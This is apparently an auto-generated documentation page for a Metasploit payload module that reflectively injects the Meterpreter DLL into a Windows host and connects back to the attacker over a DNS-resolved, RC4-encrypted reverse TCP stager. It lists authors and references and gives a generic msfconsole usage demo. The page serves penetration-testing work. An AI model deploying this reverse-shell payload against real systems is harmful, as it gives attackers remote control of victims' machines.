## Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS)

Inject the meterpreter server DLL via the Reflective Dll 
Injection payload (staged). Connect back to the attacker


## Module Name
payload/windows/meterpreter/reverse_tcp_rc4_dns

## Authors
* skape
* sf
* OJ Reeves
* hdm
* mihi
* RageLtMan


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/meterpreter/reverse_tcp_rc4_dns
msf payload(reverse_tcp_rc4_dns) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_rc4_dns) > set TARGET <target-id>
msf payload(reverse_tcp_rc4_dns) > show options
   ... show and set options ...
msf payload(reverse_tcp_rc4_dns) > run
```
    
    